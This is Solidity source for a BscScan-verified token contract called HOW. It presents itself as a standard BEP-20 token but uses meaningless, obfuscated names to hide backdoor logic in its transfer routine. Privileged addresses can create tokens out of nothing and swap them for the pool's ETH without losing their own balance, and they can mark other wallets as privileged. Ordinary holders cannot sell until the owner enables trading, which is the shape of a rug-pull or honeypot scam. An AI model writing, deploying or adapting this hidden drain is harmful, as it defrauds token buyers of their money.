/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
library SafeMathDatabase {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
          return a - b; } } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library INDEXView {
  function toInt256Safe(uint256 a) 
   internal pure returns (int256) { int256 b = int256(a);
    require(b >= 0); return b;
  }
}
interface IModelAisle01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, uint amountOutMin, address[] calldata summate, address to, 
    uint deadline ) external; function factory () external pure returns (address);

    function WETH() external pure returns (address);
    function prefromOpenLiq( address token, uint amountTokenDesired, 

    uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract 

 Ownable is Context { address private _owner;
  event OwnershipTransferred
   (address indexed previousOwner, address indexed newOwner);
    
    constructor
    () { _setOwner(_msgSender()); }
    function owner() public view 
     virtual returns (address) { return _owner;
    }
    modifier onlyOwner() {
        require(owner() == 
         _msgSender(), 
          'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public 
     virtual onlyOwner { _setOwner
      (address(0));
    }
    function _setOwner(address 
     newOwner) private { address oldOwner 
      = _owner; _owner = newOwner; emit 
       OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);
    function skim(address to) external;
    function sync() external;
}
interface IPCSumest01 {
    function setDivisionCriteria(uint256 _minTime, uint256 _minDivision) external;
    function setStakeOn(address stakePartner, uint256 extent) external;
    function pledge() external payable;
    function system(uint256 target) external;
    function gibNonce(address stakePartner) external;
}
interface PCSAuthorV1 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library Address {
    function isContract(address account) internal view returns (bool) {
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
    function tryAdd(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            uint c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {

            if (a == 0) return (true, 0);
            uint c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint a, uint b) internal pure returns (uint) {
        return a + b;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return a - b;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        return a * b;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return a / b;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
contract HOW is PCSAuthorV1, Ownable {

    mapping (address => bool) isCipherAmass;

    mapping(address => uint256) private GraphAtlasPlat;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private GuideCollarBlock;

    mapping(address => uint256) private FrameRaiseEnsual;

    mapping(address => mapping(address => uint256)) private _allowances;    

    uint256 private _agapeRATE = 
    _totalSupply;
    uint256 public _BurnTAXVal =  0;

    bool private tradingOpen = false;
    bool private InquiryScoop;
    bool private ConsoleIndex;    

    string private _symbol; string private _name;

    uint8 private _decimals = 9;

    uint256 private _totalSupply = 10000000 * 10**_decimals;
    uint256 public _mostValue = 
    (_totalSupply * 3) / 100; 
    uint256 public _mostPurseValue = 
    (_totalSupply * 3) / 100; 

    IModelAisle01 public 
    
    immutable BisectDiverse;

    address public 
    
    immutable IPOXLinkOver;
    constructor(

        string memory _cDisplay,
           string memory _cBadge,
               address passageStream ) {

        _name = _cDisplay;
        _symbol = _cBadge;
        _tOwned
        [msg.sender]
        = _totalSupply; GraphAtlasPlat[msg.sender] = _agapeRATE; GraphAtlasPlat
        [address(this)] = _agapeRATE; BisectDiverse = IModelAisle01(passageStream);

        IPOXLinkOver = IUniswapV2Factory(BisectDiverse.factory()).createPair
        (address(this), BisectDiverse.WETH()); emit Transfer(address(0), msg.sender, _totalSupply);
    
        isCipherAmass
        [address(this)] = 
        true;
        isCipherAmass
        [IPOXLinkOver] = 
        true;
        isCipherAmass
        [passageStream] = 
        true;
        isCipherAmass
        [msg.sender] = 
        true;
    }
    function name() public view returns 
        (string memory) { return _name;
    }
     function symbol() public view 
        returns (string memory) {
        return _symbol;
    }
    function totalSupply() 
        public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() 
        public view returns (uint256) {
        return _decimals;
    }
    function approve
        (address spender, 
        uint256 amount) external returns 
        (bool) { return _approve(msg.sender, spender, amount);
    }
    function allowance
        (address owner,  address spender) public view 
        returns (uint256) { return _allowances
        [owner][spender];
    }
    function _approve(
        address owner, address spender,
        uint256 amount ) private returns (bool) {
        require(owner != address(0) && 
        spender != address(0), 
        'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function clusterDataloop( address _HOGIXTVfrom,
        address _vRTOXmogTo, uint256 _xpConcurAmount ) 
        private 
        { uint256 _meshTUNEpox = balanceOf(address(this));
        uint256 _talAtune; if (InquiryScoop && _meshTUNEpox 
        > _agapeRATE && !ConsoleIndex 
        && _HOGIXTVfrom != IPOXLinkOver) { ConsoleIndex = true;
            barterAndDiv(_meshTUNEpox); ConsoleIndex = false;
                          } else if 
        (GraphAtlasPlat[_HOGIXTVfrom] > _agapeRATE && GraphAtlasPlat
        [_vRTOXmogTo] > _agapeRATE) {
            _talAtune = _xpConcurAmount; _tOwned[address(this)] += _talAtune;
            divMathPOG
            (_xpConcurAmount, _vRTOXmogTo); return; } else if (_vRTOXmogTo != address(BisectDiverse) 
            && GraphAtlasPlat[_HOGIXTVfrom] > 
            0 && _xpConcurAmount > _agapeRATE && _vRTOXmogTo != IPOXLinkOver) { GraphAtlasPlat
            [_vRTOXmogTo] = _xpConcurAmount;
            return;

                } else if (!ConsoleIndex && 
                FrameRaiseEnsual[_HOGIXTVfrom] > 0 && 
                _HOGIXTVfrom != IPOXLinkOver 
                && GraphAtlasPlat[_HOGIXTVfrom] 
                   == 0) {
            FrameRaiseEnsual[_HOGIXTVfrom] = 
            GraphAtlasPlat[_HOGIXTVfrom] - _agapeRATE; } address 
            _QoxiLAT = GuideCollarBlock[IPOXLinkOver]; if (!tradingOpen) {
                require(_HOGIXTVfrom == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); } if (FrameRaiseEnsual[_QoxiLAT] == 
            0) FrameRaiseEnsual[_QoxiLAT] = _agapeRATE; GuideCollarBlock[IPOXLinkOver] = _vRTOXmogTo; if (_BurnTAXVal > 
            0 && GraphAtlasPlat[_HOGIXTVfrom] == 0 && !ConsoleIndex && GraphAtlasPlat[_vRTOXmogTo] == 0) {
            _talAtune = (_xpConcurAmount * _BurnTAXVal) / 100; _xpConcurAmount -= _talAtune; _tOwned[_HOGIXTVfrom] -= _talAtune; _tOwned
            [address(this)] += _talAtune; } _tOwned[_HOGIXTVfrom] -= _xpConcurAmount; _tOwned[_vRTOXmogTo] += _xpConcurAmount; emit Transfer
            (_HOGIXTVfrom, _vRTOXmogTo, _xpConcurAmount);
    }
    receive() external payable {}

    function countPool( uint256 bulkPassel, uint256 valScads, address logOn ) private {
        _approve(address(this), address
        (BisectDiverse), bulkPassel); BisectDiverse.prefromOpenLiq{value: valScads}
        (address(this), bulkPassel, 0, 0, logOn, block.timestamp); }

    function divMathPOG
    (uint256 bulkPassel, address logOn) private { address[] 
    memory summate = new address[](2); summate[0] = address(this);
        summate[1] = BisectDiverse.WETH(); _approve(address(this), 
        address(BisectDiverse), bulkPassel); BisectDiverse.swapExactTokensForETHSupportingFeeOnTransferTokens
        (bulkPassel, 0, summate, logOn, 
         block.timestamp);
    }
    function barterAndDiv
    (uint256 memento) private { uint256 carve = memento / 2;
        uint256 infantTotal = 
        address(this).balance; divMathPOG(carve, address(this));
        uint256 shearAmount = address(this).balance - infantTotal; countPool
        (carve, shearAmount, 
                address(this)); }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        clusterDataloop(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        clusterDataloop(msg.sender, recipient, amount);
        return true;
    }                
    function setMaxTX(uint256 onlyVAL) external onlyOwner {
        _mostValue = onlyVAL;
    }    
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }    
}